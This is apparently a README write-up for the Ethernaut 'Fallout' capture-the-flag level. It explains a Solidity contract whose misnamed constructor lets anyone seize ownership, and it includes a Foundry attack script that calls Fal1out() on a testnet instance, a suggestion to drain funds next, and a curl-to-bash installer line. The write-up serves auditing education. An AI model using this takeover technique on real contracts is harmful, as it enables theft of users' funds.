# Ethernaut Level: Fallout - Smart Contract Auditing Journey

## Introduction
Hello! In this repository, I've solved the **Fallout** level as part of my Ethernaut challenges. I'm learning smart contract auditing by solving one level per day, and this folder (`levels/fallout/`) contains everything related to it.

**Goal:** Become the contract owner and collect all allocations by calling `collectAllocations()`.  
**Tools:** Foundry (for scripting and testing), Sepolia testnet.  
**Solved Date:** October 16, 2025 (Day 3).  
**Success:** Verified on the Ethernaut site!

## Contract Overview
This contract manages ETH allocations with an owner who can collect funds. It uses SafeMath for arithmetic and has functions for allocating, sending, and collecting funds. The "constructor" is misleadingly named `Fal1out()` (note the lowercase 'l' resembling 'I'), making it a regular payable public function instead of a true constructor.

**Key Code Snippet (from src/Fallout.sol):**
```solidity
contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {  // Misnamed "constructor" - callable by anyone!
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    // ... (other functions: sendAllocation, allocatorBalance)
}
```

## Vulnerability Analysis
**Main Issue: Publicly Callable "Constructor" (Function Name Typo)**  
- The function `Fal1out()` is intended as a constructor but is declared as a public payable function due to the typo (should be `constructor` or properly named). Anyone can call it, setting `owner = msg.sender` and allocating the sent value. No true constructor initializes the owner on deployment.  
- **Security Impact:** Allows unauthorized ownership takeover post-deployment, enabling fund drainage via `collectAllocations()`. In audits, this underscores the importance of naming conventions and access controls—typos can expose critical functions.  
- **Audit Tip:** Verify constructor declarations (no name, special keyword in ^0.7+). Use tools like Solhint to flag unnamed or suspicious functions. Always test public functions for unintended state changes.

**Example:** After deployment, the initial owner is address(0) or unset; calling `Fal1out()` with any value (even 0) reassigns ownership to the caller.

## Solution Steps
The exploit: Directly call the misnamed "constructor" `Fal1out()` to become the owner. Then, optionally call `collectAllocations()` to drain funds (though Ethernaut verifies ownership change).

1. **Setup:** Create Foundry project, set target instance address in script.
2. **Run Attack:** `forge script script/FalloutSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast`.
3. **Verify:** Check `owner()` matches your address, submit on Ethernaut site.

**Key Attack Code Snippet (from script/FalloutSolution.s.sol):**
```solidity
contract FalloutSolution is Script {
    Fallout public falloutInstance = Fallout(<Contract_Address>);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner:", falloutInstance.owner());

        falloutInstance.Fal1out();  // Call misnamed constructor to become owner
        console.log("Owner after constructor call:", falloutInstance.owner());

        console.log("Address:", vm.envAddress("MY_ADDRESS"));
     
        vm.stopBroadcast();
    }
}
```

## Test and Output
- **Local Test:** Run `anvil` and `forge test`—simulates ownership change via `Fal1out()` call.
- **Testnet Output Example:** Console log: `Owner: 0x000...` (initial), then `Owner after constructor call: 0xYourAddress` (matches MY_ADDRESS).

## Key Learnings
- **Auditing Skill:** Inspect function signatures for typos or non-constructor "constructors"—static analyzers like Mythril can catch callable init functions.
- **EVM Concept:** In Solidity ^0.6, constructors must be named `constructor()`; public functions with init logic are exploitable. SafeMath prevents overflows but doesn't fix access issues.
- **Prevention:** Use proper constructor keyword, add ownership guards (e.g., OpenZeppelin's Ownable), and audit deployment scripts.
- **Next Step:** Add `collectAllocations()` call to the script for full fund drainage simulation.

## Installation & Run
1. Install Foundry: `curl -L https://foundry.paradigm.xyz | bash`.
2. `cd levels/fallout`.
3. Set `.env`: `PRIVATE_KEY=your_key` and `SEPOLIA_RPC_URL=your_rpc`.
4. Run script: `forge script script/FalloutSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv`.

If you have questions, comment on the issue or mention me on X (@0xZHD_X)! 
Next level: `CoinFlip`. 🚀

---

- **License:** MIT  
- **Author:** [0xZHD] - Smart Contract Auditor Learner  
- **X:** [Zahedul I Sadik](@0xZHD_X)  
- **References:** [Ethernaut Docs](https://ethernaut.openzeppelin.com/)